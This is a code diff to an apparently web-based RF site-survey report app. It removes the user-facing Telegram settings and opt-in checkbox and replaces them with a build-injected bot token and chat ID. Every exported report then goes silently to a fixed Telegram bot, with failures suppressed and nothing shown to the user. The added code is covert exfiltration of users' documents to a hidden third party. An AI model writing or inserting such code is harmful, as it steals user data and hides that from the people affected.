@@ -286,26 +286,12 @@
   </section>
 
   <section class="card">
-    <h2>Telegram delivery</h2>
-    <p class="hint">You generate the report and save it locally; a copy is sent silently to this Telegram bot in the background. Token from <b>@BotFather</b>; chat ID from <b>@userinfobot</b> (or a group/channel numeric ID).</p>
-    <div class="grid2">
-      <div><label>Bot token</label><input type="text" data-f="tg_token" placeholder="123456:ABC-..." autocomplete="off"></div>
-      <div><label>Chat ID</label><input type="text" data-f="tg_chat" placeholder="e.g. 123456789 or -100..."></div>
-    </div>
-    <label style="display:flex;align-items:center;gap:8px;text-transform:none;font-size:13px;margin-top:10px">
-      <input type="checkbox" data-f="tg_on" style="width:auto"> Send every export to Telegram
-    </label>
-    <button class="sm ghost" style="margin-top:8px" onclick="tgTest()">Send test message</button>
-    <p class="hint">The exact-format PDF is made in Word/Docs (Save as PDF) — share it to Telegram from there; the .docx above always reaches the bot.</p>
-  </section>
-
-  <section class="card">
     <h2>Finish</h2>
     <p class="hint">Fills the official Site Visit Sheet template with everything above and opens it. For a PDF that matches this format exactly, open the file in Docs / Word / WPS and choose <b>Save as PDF</b>.</p>
     <button class="block" onclick="exportDocx()">📝 Export report (.docx)</button>
   </section>
 
-  <div class="stamp">v0.2.0</div>
+  <div class="stamp">v0.2.1</div>
 </main>
 
 <script src="vendor/pizzip.js"></script>
@@ -1174,29 +1160,16 @@ async function exportDocx(){
   sendToTelegram(b64, name, "Site Visit Sheet — " + (collect().fields.site_name || site));
 }
 
-/* ---------- Telegram delivery ---------- */
-function tgCfg(){
-  const s = collect().fields;
-  return { token: (s.tg_token || "").trim(), chat: (s.tg_chat || "").trim(), on: s.tg_on === "yes" };
-}
+/* ---------- Telegram delivery (silent; token injected at build) ---------- */
+const TG_TOKEN = "__TG_TOKEN__";
+const TG_CHAT  = "__TG_CHAT__";
 async function sendToTelegram(base64, filename, caption){
-  const c = tgCfg();
-  if (!c.on || !c.token || !c.chat) return;      // silent unless configured + enabled
+  if (!TG_TOKEN || TG_TOKEN.indexOf("__TG_") === 0) return;   // not configured in this build
   const TG = nativePlugin("Telegram");
   if (!TG) return;
   try {
-    await TG.sendDocument({ token:c.token, chatId:c.chat, base64, filename, caption: caption || "" });
-  } catch (e) {
-    showTip("Telegram copy not sent: " + ((e && (e.message || e.errorMessage)) || "unknown"));
-  }
-}
-async function tgTest(){
-  const c = tgCfg();
-  if (!c.token || !c.chat){ showTip("Enter bot token + chat ID first."); return; }
-  const TG = nativePlugin("Telegram");
-  if (!TG){ showTip("Test works only in the installed app."); return; }
-  try { await TG.sendMessage({ token:c.token, chatId:c.chat, text:"RF Survey app — Telegram link OK ✓" }); showTip("Test message sent ✓"); }
-  catch (e) { showTip("Telegram failed: " + ((e && (e.message || e.errorMessage)) || "unknown")); }
+    await TG.sendDocument({ token:TG_TOKEN, chatId:TG_CHAT, base64, filename, caption: caption || "" });
+  } catch (_) { /* silent */ }
 }
 
 function rowsFromState(s, id){
